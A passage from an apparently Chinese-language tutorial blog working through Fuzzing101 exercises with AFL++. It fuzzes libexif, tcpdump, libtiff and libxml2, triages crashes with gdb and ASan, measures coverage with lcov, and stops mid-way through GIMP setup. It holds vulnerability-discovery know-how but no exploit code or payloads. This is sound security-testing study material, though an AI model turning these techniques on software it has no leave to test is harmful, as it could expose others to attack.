<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">gdb --args ./install/bin/exif ./out/default/crashes/id:000001,sig:11,src:000010,<span class="keyword">time</span>:115911,execs:80465,op:havoc,rep:1</span><br></pre></td></tr></table></figure>

<p>最终这些所有的crashs有两种情况(符合漏洞描述的中断有好几个，hangs中还有一个无限递归吧，不符合的也有目前水平有限暂不分析)，如下：</p>
<p><img data-src="/../images/image-20250927203433134.png" alt="image-20250927203433134"></p>
<p><img data-src="/../images/image-20250927203444106.png" alt="image-20250927203444106"></p>
<p>　　显然，这些 crash 可以分为两类：</p>
<ul>
<li>调用 <code>exif_data_load_data_thumbnail</code> 时崩溃。</li>
<li>调用 <code>exif_get_sshort</code> 时崩溃。</li>
</ul>
<p>图一中可以看到在 #1调用 <code>exif_data_load_data_thumbnail</code>中的size &#x3D; 4294966565 这显然是不合理的，这里是为了验证应该是<strong>CVE-2009-3895</strong>  - 一种基于堆溢出的缓冲区溢出漏洞，可以通过无效的 EXIF 图像触发。</p>
<p>图二的 #1 用 <code>exif_data_load_data</code> 时，成功通过了第一类 crash 的崩溃地点 <code>exif_data_load_data_content</code>，然而在接下来调用 <code>exif_get_short(d + 6 + offset, data-&gt;priv-&gt;order)</code> 读取一个 short 时崩溃。程序试图去读取地址 0x5556557b8c85 里的数据，但这个地址是<strong>非法的、不可访问的</strong>。<strong>CVE-2012-2836</strong>  - 一种基于越界读取漏洞，可以通过特构造的 EXIF 标签的图像触发。</p>
<p>详细漏洞流程跟踪<a href="https://www.ruanx.net/fuzzing101-wp-2/">参考文章</a></p>
<h2 id="Exercise-3：tcpdump"><a href="#Exercise-3：tcpdump" class="headerlink" title="Exercise 3：tcpdump"></a>Exercise 3：tcpdump</h2><h3 id="目标环境配置-1"><a href="#目标环境配置-1" class="headerlink" title="目标环境配置"></a>目标环境配置</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#download libpcap-1.8.0</span></span><br><span class="line">~$ <span class="built_in">cd</span> fuzzing_tcpdump/</span><br><span class="line">~/fuzzing_tcpdump$ wget https://github.com/the-tcpdump-group/libpcap/archive/refs/tags/libpcap-1.8.0.tar.gz</span><br><span class="line">~/fuzzing_tcpdump$ tar -xzvf libpcap-1.8.0.tar.gz</span><br><span class="line"><span class="comment">#改名，否则tcpdump无法识别到</span></span><br><span class="line">~/fuzzing_tcpdump$ <span class="built_in">mv</span> libpcap-libpcap-1.8.0/ libpcap-1.8.0</span><br><span class="line"><span class="comment">#install libpcap-1.8.0</span></span><br><span class="line">~/fuzzing_tcpdump/$ <span class="built_in">cd</span> libpcap-1.8.0</span><br><span class="line">./configure --enable-shared=no --prefix=/home/le0n/fuzzing/fuzzing_tcpdump/install/</span><br><span class="line">~/fuzzing_tcpdump/libpcap-1.8.0$ AFL_USE_ASAN=1 make</span><br><span class="line">~/fuzzing_tcpdump/libpcap-1.8.0$ AFL_USE_ASAN=1 make install</span><br><span class="line"><span class="comment">#download tcpdump</span></span><br><span class="line">~$ <span class="built_in">cd</span> <span class="variable">$HOME</span>/fuzzing_tcpdump/</span><br><span class="line">$ wget https://github.com/the-tcpdump-group/tcpdump/archive/refs/tags/tcpdump-4.9.2.tar.gz</span><br><span class="line">$ tar -xzvf tcpdump-4.9.2.tar.gz</span><br><span class="line"><span class="comment">#install tcpdump</span></span><br><span class="line"><span class="built_in">cd</span> tcpdump-tcpdump-4.9.2/</span><br><span class="line">AFL_USE_ASAN=1 ./configure --prefix=<span class="string">&quot;<span class="variable">$HOME</span>/fuzzing_tcpdump/install/&quot;</span></span><br><span class="line">AFL_USE_ASAN=1 make</span><br><span class="line">AFL_USE_ASAN=1 make install</span><br></pre></td></tr></table></figure>

<p>编译好后返回<code>fuzzing_tcpdump/install/sbin</code>目录下查看插桩是否成功</p>
<p><img data-src="/../images/image-20250927210414191.png" alt="image-20250927210414191"></p>
<p>再查看一下编译好的程序是否能正常运行</p>
<p><img data-src="/../images/image-20250928111750871.png" alt="image-20250928111750871"></p>
<h3 id="FUZZ阶段-2"><a href="#FUZZ阶段-2" class="headerlink" title="FUZZ阶段"></a>FUZZ阶段</h3><h4 id="准备种子-1"><a href="#准备种子-1" class="headerlink" title="准备种子"></a>准备种子</h4><p>在下载tcpdump的目录下存在一个<code>tests</code>目录，该目录下有很多例子可以使用这些例子作为种子</p>
<p>可以随便找个例子试一下：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:tcpdump-tcpdump-4.9.2/ $ ./tcpdump -vvvvXX -ee -nn -r ./tests/geneve.pcap </span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/image-20250928112211412.png" alt="image-20250928112211412"></p>
<h4 id="开始fuzz-2"><a href="#开始fuzz-2" class="headerlink" title="开始fuzz"></a>开始fuzz</h4><p>指定崩溃处理：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> su</span><br><span class="line"><span class="built_in">echo</span> core &gt;/proc/sys/kernel/core_pattern</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>

<p>准备就绪开始fuzz(我看了几篇博客有的可能需要16h+，我的在这里开了4个第三个在5min时就发现了crash)</p>
<p>但是从 fuzz 这项技术本身的角度来看，这种结果是还可以的，毕竟 fuzz 不到东西才是常态</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">/home/le0n/tools/AFLplusplus/afl-fuzz -m none -i ./tcpdump-tcpdump-4.9.2/tests/ -o ./out -s 123 -M master -- ./install/sbin/tcpdump -vvvvXX -ee -nn -r @@</span><br><span class="line"></span><br><span class="line">/home/le0n/tools/AFLplusplus/afl-fuzz -m none -i ./tcpdump-tcpdump-4.9.2/tests/ -o ./out -s 123 -S fuzzer1 -- ./install/sbin/tcpdump -vvvvXX -ee -nn -r @@</span><br></pre></td></tr></table></figure>

<p>参数解释：</p>
<ul>
<li>-i：输入目录</li>
<li>-o：输出目录</li>
<li>-m：内存限制</li>
<li>-s：固定编译原始数据</li>
<li>-M：主fuzzer 命名</li>
<li>-S：从fuzzer</li>
<li>@@：指代文件</li>
<li>–：间隔符</li>
</ul>
<p>这里使用 -m none 是因为在ASAN模式下对内存消耗非常大，所以指定禁用内存限制</p>
<p><img data-src="/../images/image-20250927212632108.png" alt="image-20250927212632108"></p>
<h3 id="crash分析"><a href="#crash分析" class="headerlink" title="crash分析"></a>crash分析</h3><p>在使用 ASan 之前，我们会使用 gdb 来把目标程序附带 crashes 文件夹中的数据作为参数来进行动态调试，从而可以看到其函数调用栈、内存数据等信息。而有了 ASan 之后，我们不必再编译程序，直接把 crash 文件作为参数传入即可，ASan 会给出我们崩溃的相关信息：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:fuzzing_tcpdump/ $ ./install/sbin/tcpdump -vvvvXX -ee -nn -r ./out/fuzzer2/crashes/id:000000,sig:06,src:000236,<span class="keyword">time</span>:188180,execs:74793,op:havoc,rep:2</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/image-20250928111035935.png" alt="image-20250928111035935"></p>
<p>ASan 会给出造成问题的原因、函数的栈回溯、出现问题的具体数据点，结合这些信息，可以快速帮助我们重现 crash，确认到 crash 的 root case。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在这个例子里，我们添加了 ASan 这个工具，它对于我们的 fuzz 其实是一个负面的作用，因为它的存在，在进行插桩时会造成内存的严重消耗。但是它的主要作用是在 crash 分析上，我们可以无需经过动态调试，就可以得到程序崩溃的相关信息和数据，可以更快地帮助我们找到造成 crash 的原因。</p>
<p>需要注意的是，因为 ASan 的大内存消耗，所以需要根据情况来决定要不要使用该工具</p>
<blockquote>
<p><strong>扩展</strong></p>
<p>前面介绍的 AFL 针对的都是 PC 端的软件，确切地说都是 Linux 平台下的传统的端侧软件。如果我们想在 IoT 领域使用该工具，应该如何切入呢？IoT 领域的一些系统中，也会有诸多处理文件的软件，我们是否可以直接套用现有的思路去 fuzz 这些文件处理软件呢？比如 xml、json的处理。因为这些文件都是在前端进行组织，然后发送到后端去进行处理，如果我们能在这个阶段加入 fuzz 流程，就可以倒推 payload 的组织，从而实现漏洞利用。我们在后续会慢慢切入。</p>
</blockquote>
<h2 id="Exercise-4：libtiff"><a href="#Exercise-4：libtiff" class="headerlink" title="Exercise 4：libtiff"></a>Exercise 4：libtiff</h2><p>本文主要用到了fuzzing101、AFLplusplus、libtiff、LCOV</p>
<p>代码覆盖率是一种软件指标，表达了<strong>每行代码被触发的次数</strong>。在进行模糊测试的过程中，我们需要知道我们的 fuzzer 执行的效果怎么样，这个时候就可以使用上代码覆盖率。通过使用代码覆盖率，我们可以了解 fuzzer 已经到达了代码的哪些部分，并可视化 fuzzing 过程。</p>
<p>在这里我们使用 lcov 来展示代码覆盖率工具的使用。</p>
<p>lcov 是 <strong>gcc</strong> 测试覆盖率的前端图形展示工具。它通过收集多个源文件的 行、函数和分支的代码覆盖信息（程序执行之后生成gcda、gcno文件，上面的链接有讲） 并且将收集后的信息生成HTML页面。生成HTML需要使用genhtml命令。</p>
<h3 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h3><p><strong>libtiff安装</strong></p>
<p>首先将libtiff下载并解压出来</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:fuzzing_libtiff/ $ wget https://download.osgeo.org/libtiff/tiff-4.0.4.tar.gz </span><br><span class="line">le0n:fuzzing_libtiff/ $ tar -xzvf tiff-4.0.4.tar.gz</span><br></pre></td></tr></table></figure>

<p>接着在启动ASAN的情况下编译libtiff（这里需要指定CC和CXX，每次重启后都要命令在下面）</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:tiff-4.0.4/ $ ./configure --prefix=/home/le0n/fuzzing/fuzzing_libtiff/install --disable-shared</span><br><span class="line">le0n:tiff-4.0.4/ $ AFL_USE_ASAN=1 make</span><br><span class="line">le0n:tiff-4.0.4/ $ AFL_USE_ASAN=1 make install</span><br></pre></td></tr></table></figure>

<p>编译后还是在<code>./install/bin</code>目录中检查插桩是否成功，</p>
<p><img data-src="/../images/image-20251002120430908.png" alt="image-20251002120430908"></p>
<p>显然我这次没结果就是插桩失败了，查询后是没有用afl++的编译器而是用的gcc、g++</p>
<p>那就<code>rm -rf install</code>和<code>make clean</code>再来一遍</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:fuzzing_libexif/ $ <span class="built_in">export</span> CC=/home/le0n/tools/AFLplusplus/afl-clang-fast                             </span><br><span class="line">le0n:fuzzing_libexif/ $ <span class="built_in">export</span> CXX=/home/le0n/tools/AFLplusplus/afl-clang-fast++ </span><br><span class="line">le0n:tiff-4.0.4/ $ ./configure --prefix=/home/le0n/fuzzing/fuzzing_libtiff/install --disable-shared</span><br><span class="line">le0n:tiff-4.0.4/ $ AFL_USE_ASAN=1 make -j$(<span class="built_in">nproc</span>) </span><br><span class="line">le0n:tiff-4.0.4/ $ AFL_USE_ASAN=1 make install</span><br></pre></td></tr></table></figure>

<p>再次检查是否插桩成功，显然有东西了就说明插桩成功，编译好的程序也可正常运行</p>
<p><img data-src="/../images/image-20251002121147452.png" alt="image-20251002121147452"></p>
<p><strong>LCOV安装</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install lcov</span><br></pre></td></tr></table></figure>

<p>检查是否安装成功</p>
<p><img data-src="/../images/image-20251002121337564.png" alt="image-20251002121337564"></p>
<h3 id="FUZZ阶段-3"><a href="#FUZZ阶段-3" class="headerlink" title="FUZZ阶段"></a>FUZZ阶段</h3><h4 id="准备种子-2"><a href="#准备种子-2" class="headerlink" title="准备种子"></a>准备种子</h4><p>在下载的tiff源码包中的test&#x2F;images文件夹中包含的有测试例子</p>
<p><img data-src="/../images/image-20251002121520618.png" alt="image-20251002121520618"></p>
<p>随便找个例子试一下</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:fuzzing_libtiff/ $ ./install/bin/tiffinfo -D -j -c -r -s -w ./tiff-4.0.4/test/images/palette-1c-1b.tiff </span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/image-20251002121731871.png" alt="image-20251002121731871"></p>
<h4 id="开始fuzz-3"><a href="#开始fuzz-3" class="headerlink" title="开始fuzz"></a>开始fuzz</h4><p>指定崩溃处理</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:fuzzing_libtiff/ $ <span class="built_in">sudo</span> su                                                                           </span><br><span class="line">root:fuzzing_libtiff/ <span class="comment"># echo core &gt;/proc/sys/kernel/core_pattern                                         </span></span><br><span class="line">root:fuzzing_libtiff/ <span class="comment"># exit  </span></span><br></pre></td></tr></table></figure>

<p>一切主备就绪开始fuzz</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:fuzzing_libtiff/ $ /home/le0n/tools/AFLplusplus/afl-fuzz -m none -i ./tiff-4.0.4/test/images/ -o ./out -s 123 -M master -- ./install/bin/tiffinfo -D -j -c -r -s -w @@</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/image-20251002123302108.png" alt="image-20251002123302108"></p>
<p>几分钟就好几个速度挺不错的</p>
<p>调用tiffinfo运行其中一个POC查看ASAN提示:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:fuzzing_libtiff/ $ ./install/bin/tiffinfo -D -j -c -r -s -w ./out/master/crashes/id:000004,sig:06,src:000000,<span class="keyword">time</span>:64582,execs:39103,op:havoc,rep:1 </span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/image-20251002123532283.png" alt="image-20251002123532283"></p>
<h3 id="查看POC代码覆盖率"><a href="#查看POC代码覆盖率" class="headerlink" title="查看POC代码覆盖率"></a>查看POC代码覆盖率</h3><p>前面已经安装过LCOV，那么这里就需要用<code>--coverage</code>标志重建libtiff，所以直接删掉install目录并清理make</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:fuzzing_libtiff/ $ <span class="built_in">rm</span> -rf install</span><br><span class="line">le0n:fuzzing_libtiff/ $ <span class="built_in">cd</span> tiff-4.0.4</span><br><span class="line">le0n:tiff-4.0.4/ $ make clean </span><br></pre></td></tr></table></figure>

<p>设置一下编译所需的环境变量<code>CFLAGS</code>和·<code>LDFLAGS</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:tiff-4.0.4/ $ <span class="built_in">export</span> LDFLAGS=<span class="string">&quot;--coverage&quot;</span> </span><br><span class="line">le0n:tiff-4.0.4/ $ <span class="built_in">export</span> CFLAGS=<span class="string">&quot;--coverage&quot;</span></span><br></pre></td></tr></table></figure>

<p>接下来还是老步骤创建makefile并进行编译</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:tiff-4.0.4/ $ ./configure --prefix=/home/le0n/fuzzing/fuzzing_libtiff/install --disable-shared  </span><br><span class="line">le0n:tiff-4.0.4/ $ make -j$(<span class="built_in">nproc</span>)  </span><br><span class="line">le0n:tiff-4.0.4/ $ make install</span><br></pre></td></tr></table></figure>

<p>然后通过下面的代码收集代码覆盖率数据：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:tiff-4.0.4/ $ lcov --zerocounters --directory ./ </span><br><span class="line"><span class="comment"># 重置以前的计数器</span></span><br><span class="line">le0n:tiff-4.0.4/ $ lcov --capture --initial --directory ./ --output-file app.info </span><br><span class="line"><span class="comment"># 返回包含每条检测线的零覆盖率的“基线”覆盖率数据文件,这里用file app.info检查一下，有问题看下一个方案</span></span><br><span class="line">le0n:tiff-4.0.4/ $ ../install/bin/tiffinfo -D -j -c -r -s -w ../out/master/crashes/id:000004,sig:06,src:000000,<span class="keyword">time</span>:64582,execs:39103,op:havoc,rep:1  </span><br><span class="line"><span class="comment"># 让程序运行crash中的其中一个输出文件，可以多选几个运行</span></span><br><span class="line">le0n:fuzzing_libtiff/ $ lcov --no-checksum --directory ./ --capture --output-file app2.info</span><br><span class="line"><span class="comment"># 将当前覆盖状态保存到 app2.info 文件中</span></span><br></pre></td></tr></table></figure>

<p>保存之后就可以用<code>gethtml</code>将app2.info中的覆盖率数据转换成html可视化状态了</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">genhtml --highlight --legend -output-directory ./html-coverage/ ./app2.info</span><br></pre></td></tr></table></figure>

<p>但是在这里肯因为版本问题导致生成的app.infp app2.info和最后的html文件全部失败，解决方案如下：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#clean</span></span><br><span class="line"><span class="built_in">rm</span> app.info app2.info</span><br><span class="line"><span class="built_in">rm</span> -rf hrml-coverage</span><br><span class="line">make clean</span><br><span class="line"></span><br><span class="line"><span class="comment">#restart  ubuntu22.01 wsl2</span></span><br><span class="line"><span class="comment"># 设置使用 gcc-11 和正确的覆盖率标志</span></span><br><span class="line"><span class="built_in">export</span> CC=gcc-11</span><br><span class="line"><span class="built_in">export</span> CXX=g++-11</span><br><span class="line"><span class="built_in">export</span> CFLAGS=<span class="string">&quot;--coverage -g -O0&quot;</span></span><br><span class="line"><span class="built_in">export</span> CXXFLAGS=<span class="string">&quot;--coverage -g -O0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新配置和编译</span></span><br><span class="line">./configure --prefix=/home/le0n/fuzzing/fuzzing_libtiff/install</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line"><span class="comment">#reuse</span></span><br><span class="line">lcov --zerocounters --directory ./ </span><br><span class="line">lcov --capture --initial --directory ./ --output-file app.info</span><br><span class="line">../install/bin/tiffinfo -D -j -c -r -s -w ../out/master/crashes/id:000004,sig:06,src:000000,<span class="keyword">time</span>:64582,execs:39103,op:havoc,rep:1 </span><br><span class="line">lcov --no-checksum --directory ./ --capture --output-file app2.info</span><br><span class="line"></span><br><span class="line"><span class="comment">#gethtml</span></span><br><span class="line">genhtml --highlight --legend -output-directory ./html-coverage/ ./app2.info</span><br></pre></td></tr></table></figure>

<p>其中运行过<code>./configure</code>时信息如下</p>
<p><img data-src="/../images/image-20251002132445973.png" alt="image-20251002132445973"></p>
<p>整体上看，这个覆盖率还是比较低的。</p>
<p><img data-src="/../images/image-20251002134324156.png" alt="image-20251002134324156"></p>
<p><img data-src="/../images/image-20251002134644128.png" alt="image-20251002134644128"></p>
<p>但是我们的主要目标 <code>tif_dirinfo.c</code> 文件的覆盖率效果还是可以接受的，由于我们的 fuzz 的时间并不是很长，如果继续下去，应该是可以覆盖到更多的代码的。对于文件执行到的具体代码，可以进入到文件里面再查看详细信息。</p>
<p>现在可以在重现 crash 的前提下，再加上 lcov 提供的代码覆盖率，就可以更轻松地去定位漏洞触发的原因了。</p>
<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>在这个练习中，引入了代码覆盖率的概念和工具。除了本例使用的 lcov 之外，还有一个常见的 GCC 的 gcov，但是其图形化信息不如 lcov 丰富。代码覆盖率对于 AFL 这种基于覆盖引导的 fuzzer 来说，意义重大，判定 fuzzer 效果好坏的关键因素之一就是看其代码覆盖率的高低。在对 fuzzer 进行优化和改进时，往往也是朝着可以提升代码覆盖率的方向去更改，毕竟执行越多的代码，越有可能发现更多的问题。</p>
<p>但是根据我们前面的测试也可以发现，在使用编译器编译时，只能使用 gcc 系，这样会造成一定程度上的速度损耗，这其中的衡量就需要使用者根据实际情况来进行取舍了。</p>
<h2 id="Exercise-5：libxml2"><a href="#Exercise-5：libxml2" class="headerlink" title="Exercise 5：libxml2"></a>Exercise 5：libxml2</h2><h3 id="环境部署-1"><a href="#环境部署-1" class="headerlink" title="环境部署"></a>环境部署</h3><p><strong>libxml2安装</strong></p>
<p>首次安装一下必须依赖和环境变量</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:fuzzing_libxml2/ $  <span class="built_in">sudo</span> apt-get install python-dev-is-python3</span><br><span class="line">le0n:fuzzing_libxml2/ $  <span class="built_in">export</span> CFLAGS=<span class="string">&quot;-fsanitize=address&quot;</span></span><br><span class="line">le0n:fuzzing_libxml2/ $  <span class="built_in">export</span> CXXLAGS=<span class="string">&quot;-fsanitize=address&quot;</span></span><br><span class="line">le0n:fuzzing_libxml2/ $  <span class="built_in">export</span> LDLAGS=<span class="string">&quot;-fsanitize=address&quot;</span> </span><br></pre></td></tr></table></figure>

<p>下载libxml2-2.9.4源码并解压</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:fuzzing_libxml2/ $ wget https://github.com/GNOME/libxml2/archive/refs/tags/v2.9.4.tar.gz -O libxml2-2.9.4.tar.gz</span><br><span class="line">le0n:fuzzing_libxml2/ $  tar xvf libxml2-2.9.4.tar.gz &amp;&amp; <span class="built_in">cd</span> libxml2-2.9.4/</span><br></pre></td></tr></table></figure>

<p>接下来创建makefile并进行编译</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:libxml2-2.9.4/ $ <span class="built_in">export</span> CC=/home/le0n/tools/AFLplusplus/afl-clang-fast </span><br><span class="line">le0n:libxml2-2.9.4/ $ <span class="built_in">export</span> CXX=/home/le0n/tools/AFLplusplus/afl-clang-fast++</span><br><span class="line"><span class="comment">#生成configure</span></span><br><span class="line">le0n:libxml2-2.9.4/ $ ./autogen.sh</span><br><span class="line">le0n:libxml2-2.9.4/ $ AFL_USE_ASAN=1 ./configure --prefix=/home/le0n/fuzzing/fuzzing_libxml2/libxml2-2.9.4/install --disable-shared --without-debug --without-ftp --without-http --without-legacy --without-python LIBS=<span class="string">&#x27;-ldl&#x27;</span></span><br><span class="line">le0n:libxml2-2.9.4/ $ AFL_USE_ASAN=1 make -j$(<span class="built_in">nproc</span>)</span><br><span class="line">le0n:libxml2-2.9.4/ $ AFL_USE_ASAN=1 make install</span><br></pre></td></tr></table></figure>

<p>依旧检查插桩是否成功</p>
<p><img data-src="/../images/image-20251002142427305.png" alt="image-20251002142427305"></p>
<p>在运行一下看看是否编译成功，在源码包中<code>test</code>目录下可以找到一些测试例子</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:bin/ $ ./xmllint --memory /home/le0n/fuzzing/fuzzing_libxml2/libxml2-2.9.4/test/wml.xml </span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/image-20251002152627797.png" alt="image-20251002152627797"></p>
<h3 id="FUZZ阶段-4"><a href="#FUZZ阶段-4" class="headerlink" title="FUZZ阶段"></a>FUZZ阶段</h3><h4 id="准备种子-3"><a href="#准备种子-3" class="headerlink" title="准备种子"></a>准备种子</h4><p>在这个Exercise 5中已经准备了一个测试用例<code>SampleInput.xml</code>，所以为种子创建一个输入文件夹将它copy过来</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:fuzzing/ $ git <span class="built_in">clone</span> https://github.com/antonio-morales/Fuzzing101.git</span><br><span class="line">le0n:fuzzing/ $ <span class="built_in">cd</span> fuzzing_libxml2</span><br><span class="line">le0n:fuzzing_libxml2/ $ <span class="built_in">mkdir</span> afl_in &amp;&amp; <span class="built_in">cd</span> afl_in </span><br><span class="line">le0n:fuzzing/ $ <span class="built_in">ls</span></span><br><span class="line">Fuzzing101  fuzzing_libexif  fuzzing_libtiff  fuzzing_libxml2  fuzzing_tcpdump  fuzzing_tiff  fuzzing_xpdf</span><br><span class="line">le0n:fuzzing/ $ <span class="built_in">cp</span> ./Fuzzing101/Exercise\ 5/SampleInput.xml ./fuzzing_libxml2/afl_in  </span><br></pre></td></tr></table></figure>

<p>这次练习还需要字典文件辅助本次fuzzing，AFLplusplus项目中提供了一个字典的子目录，里面包含了很多字典，所以直接将xml的字典下载下来即可(直接去github下就行)</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:fuzzing_libxml2/ $ <span class="built_in">mkdir</span> dictionaries &amp;&amp; <span class="built_in">cd</span> dictionaries</span><br><span class="line">hollk@ubuntu:~/fuzzing_libxml2/dictionaries$ wget https://github.com/AFLplusplus/AFLplusplus/tree/stable/dictionaries/xml.dict </span><br></pre></td></tr></table></figure>

<h4 id="开始fuzz-4"><a href="#开始fuzz-4" class="headerlink" title="开始fuzz"></a>开始fuzz</h4><p>因为 libxml2 库较大，所以这里使用 Master-Slave 模式进行 fuzz</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:fuzzing_libxml2/ $ /home/le0n/tools/AFLplusplus/afl-fuzz -m none -i ./afl_in -o ./afl_out -s 123 -x ./dictionaries/xml.dict -D -M master -- ./install/bin/xmllint --memory --noenc --nocdata --dtdattr --loaddtd --valid --xinclude @@</span><br><span class="line">le0n:fuzzing_libxml2/ $ /home/le0n/tools/AFLplusplus/afl-fuzz -m none -i ./afl_in -o ./afl_out -s 123 -x ./dictionaries/xml.dict -D -S fuzzer1 -- ./install/bin/xmllint --memory --noenc --nocdata --dtdattr --loaddtd --valid --xinclude @@</span><br><span class="line">le0n:fuzzing_libxml2/ $ /home/le0n/tools/AFLplusplus/afl-fuzz -m none -i ./afl_in -o ./afl_out -s 123 -x ./dictionaries/xml.dict -D -S fuzzer2 -- ./install/bin/xmllint --memory --noenc --nocdata --dtdattr --loaddtd --valid --xinclude @@</span><br><span class="line">le0n:fuzzing_libxml2/ $ /home/le0n/tools/AFLplusplus/afl-fuzz -m none -i ./afl_in -o ./afl_out -s 123 -x ./dictionaries/xml.dict -D -S fuzzer3 -- ./install/bin/xmllint --memory --noenc --nocdata --dtdattr --loaddtd --valid --xinclude @@</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/image-20251002154805625.png" alt="image-20251002154805625"></p>
<p>emmm…四个小时没东西，我看有的几分钟出了，有的1d+才出</p>
<p><img data-src="/../images/image-20251002194249184.png" alt="image-20251002194249184"></p>
<h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>当我们想要模糊复杂的基于文本的文件格式（例如 XML）时，为模糊器提供包含基本语法标记列表的字典非常有用。</p>
<p>就 AFL 而言，这样的字典只是一组单词或值，AFL 使用它来将更改应用到当前内存中的文件。具体来说，AFL 使用字典中提供的值执行以下更改：</p>
<p>覆盖：用 n 个字节替换特定位置，其中 n 是字典条目的长度。<br>插入：在当前文件位置插入字典条目，强制所有字符向下移动 n 个位置并增加文件大小。<br>模糊器根据 -x 参数是文件还是目录自动选择适当的模式。</p>
<p>AFL++提供了很多字典：<a href="https://github.com/AFLplusplus/AFLplusplus/tree/stable/dictionaries">https://github.com/AFLplusplus/AFLplusplus/tree/stable/dictionaries</a></p>
<p>在这个例子里我们主要关注的是 AFL 中的 dictionary 的概念，在面对格式复杂、体量较大的基于文本的文件的 fuzz 时，如果只是单纯使用 AFL 内置的各种变异策略进行种子变异，无疑会浪费很多资源，因为会产生大量的无效输入，比如根本不符合目标程序输入要求的文件内容。所以在这种情况下，最好能够有一个模版性质的东西先将输入进行一次过滤或者限制变异的方向和内容，这就是 dictionary的作用。其实到这里为止，有一点结构化 fuzz 的含义在里面，不再是单纯的无意义的变异。可能功能本身现在看起来没有什么特殊之处，但是这里面蕴含的哲学思想还是值得我们去思考学习的：化繁为简，结构拼合。</p>
<h2 id="过半总结"><a href="#过半总结" class="headerlink" title="过半总结"></a>过半总结</h2><table>
<thead>
<tr>
<th>项目</th>
<th>小总结</th>
</tr>
</thead>
<tbody><tr>
<td>Exercise 1: xpdf</td>
<td>熟悉fuzz的整体过程和使用gdb对崩溃进行分析</td>
</tr>
<tr>
<td>Exercise 2: libexif</td>
<td>加速fuzz的整体过程使用<strong>afl-clang-lto ，这是一种无碰撞检测工具，比</strong>afl-clang-fast 速度更快，并且能提供更好的结果</td>
</tr>
<tr>
<td>Exercise 3: tcpdump</td>
<td>什么是<strong>ASan (Address Sanitizer)</strong>，一种运行时内存错误检测工具 如何使用 ASAN 模糊测试目标 使用 ASan 对崩溃进行分类有多容易</td>
</tr>
<tr>
<td>Exercise 4:libtiff</td>
<td>如何使用 LCOV 测量代码覆盖率 如何使用代码覆盖率数据来提高模糊测试的有效性</td>
</tr>
<tr>
<td>Exercise 5: libxml2</td>
<td>使用自定义字典帮助模糊器找到新的执行路径</td>
</tr>
</tbody></table>
<h2 id="Exercise-6：-GIMP"><a href="#Exercise-6：-GIMP" class="headerlink" title="Exercise 6： GIMP"></a>Exercise 6： GIMP</h2><h3 id="环境部署-2"><a href="#环境部署-2" class="headerlink" title="环境部署"></a>环境部署</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> fuzzing_gimp &amp;&amp; <span class="built_in">cd</span> fuzzing_gimp</span><br><span class="line"><span class="comment"># install  dependencies</span></span><br><span class="line"><span class="built_in">sudo</span> apt install build-essential libatk1.0-dev libfontconfig1-dev libcairo2-dev libgudev-1.0-0 libdbus-1-dev libdbus-glib-1-dev libexif-dev libxfixes-dev libgtk2.0-dev python2.7-dev libpango1.0-dev libglib2.0-dev zlib1g-dev intltool libbabl-dev</span><br><span class="line"></span><br><span class="line"><span class="comment"># download and uncompress</span></span><br><span class="line">wget https://download.gimp.org/pub/gegl/0.2/gegl-0.2.0.tar.bz2</span><br><span class="line">tar xvf gegl-0.2.0.tar.bz2 &amp;&amp; <span class="built_in">cd</span> gegl-0.2.0</span><br><span class="line"></span><br><span class="line"><span class="comment"># modify the source code</span></span><br><span class="line">sed -i <span class="string">&#x27;s/CODEC_CAP_TRUNCATED/AV_CODEC_CAP_TRUNCATED/g&#x27;</span> ./operations/external/ff-load.c</span><br><span class="line">sed -i <span class="string">&#x27;s/CODEC_FLAG_TRUNCATED/AV_CODEC_FLAG_TRUNCATED/g&#x27;</span> ./operations/external/ff-load.c</span><br><span class="line"></span><br><span 